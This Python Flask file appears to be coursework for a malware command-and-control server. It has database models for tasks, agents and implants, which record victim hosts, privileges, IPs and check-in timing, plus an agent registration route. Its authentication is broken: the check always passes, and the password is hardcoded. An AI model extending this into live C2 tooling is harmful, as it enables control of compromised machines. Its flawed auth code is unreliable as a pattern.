from ipaddress import ip_address
from os import getuid
from flask import Flask , request, jsonify
from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
import hashlib

app = Flask(__name__) # use this to generate routes and handlers

# some useful notes here #
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""

# set the database to work with flask
# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite'
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/c2_server' #mysql://username:password@server/db
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
db = SQLAlchemy(app)


password = "ch0nky" # a temperary password to test the server

# code snippets from lecture13

CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"

# link to ref:https://flask-sqlalchemy.palletsprojects.com/en/2.x/models/
# The link above contain info about dataype a column could use, and explaination about how relationship work in flask.SQLAlchemy
class User(db.Model): # SQLAlchemy class for client
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    implants = db.relationship("Implant", backref='user', lazy=True)
    def __repr__(self):
        return '<User %r>' % self.username

class Task(db.Model): # a SQLAlchemy class
    id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
    # need to specify length of String if using MySQL; Feel free to change the length
    job_id = db.Column(db.String(288))
    command_type = db.Column(db.String(288))
    cmd = db.Column(db.String(4096))
    Status = db.Column(db.String(288))
    agent_id = db.Column(db.String(288))

class Agent(db.Model): # a SQLAlchemy class
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(288))
    username = db.Column(db.String(288))
    password = db.Column(db.String(288))

class Implant(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    implant_id = db.Column(db.String(288))
    computer_name = db.Column(db.String(288)) # what computer did it connect from
    username = db.Column(db.String(80), db.ForeignKey('user.username'), nullable=False) # what user are you running as
    GUID = db.Column(db.String(288)) # computer's GUID
    Integrity = db.Column(db.String(288)) # what privileges do you have
    ip_address = db.Column(db.String(32)) # what address did the implant connect from
    session_key = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
    sleep = db.Column(db.Float) # how often does the agent check in 
    jitter = db.Column(db.Float) # how random of a check in is it
    first_seen = db.Column(db.DateTime) # when did the agent first check in
    last_seen = db.Column(db.DateTime) # when was the last time you saw the agent
    expected_checkin = db.Column(db.DateTime) # when should you expect to see the agent again
    #TODO: a func to generate a new python datatime for expected checkin
    

# search agent by agent_id
# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
def find_agent_by_id(id_):
    return Agent.query.filter_by(agent_id=id_).first()


def verify_password(reg_agent_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    hex_password = hash_passoword(reg_password)
    agent = find_agent_by_id(reg_agent_id)
    return agent.password == hex_password

def hash_passoword(password):
    """
        given a password as a string, return the hashed version
    """
    h = hashlib.sha256()
    h.update(password.encode(encoding='utf-8'))
    hex_password = h.hexdigest()
    return hex_password

# the following is a route
# think of this as a subpage
# e.g. 127.0.0.1/register_agent
@app.route('/register_agent', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hash_passoword(reg_password))
    # agent = Agent(agent_id=reg_agent_id, username=reg_whoami)
    db.session.add(agent)
    db.session.commit() ## saves the data to the database

    if (reg_agent_id, reg_password):
        print("[+] a new agent has successfully registered")
        print(f"[+] agent_id: {reg_agent_id}")
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})

    print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")

    return jsonify({"status": "ok", "message": "Welcome!"})

if __name__ == '__main__':
    app.run()